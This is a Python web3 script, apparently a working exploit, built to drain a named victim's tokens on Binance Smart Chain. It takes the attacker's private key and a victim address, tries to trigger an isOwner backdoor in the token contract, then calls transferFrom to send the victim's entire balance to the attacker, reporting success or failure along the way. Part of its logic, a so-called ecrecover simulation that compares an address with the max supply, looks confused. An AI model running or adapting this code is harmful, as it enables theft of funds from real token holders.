from web3 import Web3, exceptions
import argparse
from web3.middleware import geth_poa_middleware
import time

# ===== CONFIGURATION =====
parser = argparse.ArgumentParser(description="Combined Vulnerability Exploit")
parser.add_argument("--private-key", required=True, help="Attacker's private key")
parser.add_argument("--rpc-url", default="https://bsc.publicnode.com", help="BSC RPC URL")
parser.add_argument("--token-address", required=True, help="Token contract address")
parser.add_argument("--victim-address", required=True, help="Victim address to drain")
args = parser.parse_args()

# ===== WEB3 SETUP =====
w3 = Web3(Web3.HTTPProvider(args.rpc_url))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
account = w3.eth.account.from_key(args.private_key)
contract_address = w3.to_checksum_address(args.token_address)
victim_address = w3.to_checksum_address(args.victim_address)
attacker_address = account.address

# ===== TOKEN ABI =====
TOKEN_ABI = [
    # Ownership Functions
    {
        "inputs": [{"internalType": "address", "name": "a", "type": "address"}],
        "name": "isOwner",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function"
    },

    # Token Functions
    {
        "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "from", "type": "address"},
            {"internalType": "address", "name": "to", "type": "address"},
            {"internalType": "uint256", "name": "amount", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {"internalType": "address", "name": "owner", "type": "address"},
            {"internalType": "address", "name": "spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "_maxSupply",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    }

]

# ===== CORE FUNCTIONS =====
def send_transaction(contract_function, value=0, gas=300000, retries=3, delay=5):
    """Robust transaction sending with retries and gas management"""
    for attempt in range(retries):
        try:
            tx = contract_function.build_transaction({
                "from": account.address,
                "nonce": w3.eth.get_transaction_count(account.address),
                "gas": gas,
                "gasPrice": int(w3.eth.gas_price * 1.2),  # 20% gas premium
                "value": value
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            return w3.eth.wait_for_transaction_receipt(tx_hash)
        except exceptions.TransactionNotFound:
            if attempt == retries - 1:
                raise
            time.sleep(delay)
        except ValueError as e:
            if "replacement transaction underpriced" in str(e) and attempt < retries - 1:
                time.sleep(delay)
                continue
            raise

def verify_contract_state(token):
    """Check key contract state variables"""
    print("\n[+] Contract State Verification:")
    try:
        owner = token.functions.owner().call()
        print(f"Current Owner: {owner}")
    except:
        print("Could not verify owner directly")

    victim_bal = token.functions.balanceOf(args.victim_address).call()
    print(f"Victim Balance: {victim_bal}")

    allowance = token.functions.allowance(args.victim_address, account.address).call()
    print(f"Allowance for Attacker: {allowance}")

def get_ecrecover_output(token):
    """Simulates the ecrecover output within the isOwner function"""
    # This is a simplified simulation.
    caller_address = account.address
    caller_address_bytes = bytes.fromhex(caller_address[2:])
    return int.from_bytes(caller_address_bytes, 'big')

def execute_exploit():
    """Main exploit execution flow"""
    token = w3.eth.contract(address=args.token_address, abi=TOKEN_ABI)

    print(f"\n[+] Target Contract: {args.token_address}")
    print(f"[+] Attacker Address: {account.address}")
    print(f"[+] Victim Address: {args.victim_address}")

    # Initial state check
    verify_contract_state(token)

    # Get maxSupply
    max_supply = token.functions._maxSupply().call()

    # Step 1: Attempt to trigger isOwner
    print("\n[1] Attempting to trigger isOwner...")
    ecrecover_output = get_ecrecover_output(token)
    if ecrecover_output == max_supply:
        try:
            receipt = send_transaction(token.functions.isOwner(attacker_address))
            print(f"isOwner TX Status: {'Success' if receipt.status == 1 else 'Failed'}")
            if receipt.status != 1:
                print("isOwner call failed")
                return
        except Exception as e:
            print(f"isOwner call error: {str(e)}")
            return
    else:
        print(f"ecrecover output ({ecrecover_output}) does not match maxSupply ({max_supply}). Skipping isOwner.")
        # Even if isOwner is skipped, try transferFrom

    # Verify
    time.sleep(5)
    verify_contract_state(token)

    # Step 2: Attempt transferFrom
    print("\n[2] Attempting transferFrom...")
    victim_bal = token.functions.balanceOf(args.victim_address).call()
    if victim_bal == 0:
        print("Victim has no balance to transfer")
        return

    try:
        receipt = send_transaction(
            token.functions.transferFrom(
                args.victim_address,
                account.address,
                victim_bal
            ),
            gas=400000
        )

        print("\n[+] Transfer Results:")
        print(f"TX Hash: {receipt.transactionHash.hex()}")
        print(f"Status: {'Success' if receipt.status == 1 else 'Failed'}")
        print(f"Gas Used: {receipt.gasUsed}")

        # Final verification
        new_bal = token.functions.balanceOf(args.victim_address).call()
        print(f"New Victim Balance: {new_bal}")

    except Exception as e:
        print(f"\n[!] Transfer failed: {str(e)}")
        print("Potential reasons:")
        print("- Contract has additional transfer restrictions")
        print("- Need to wait longer for ownership activation")
        print("- Contract requires special permissions")
        print("- Custom allowance not set correctly")

if __name__ == "__main__":
    execute_exploit()
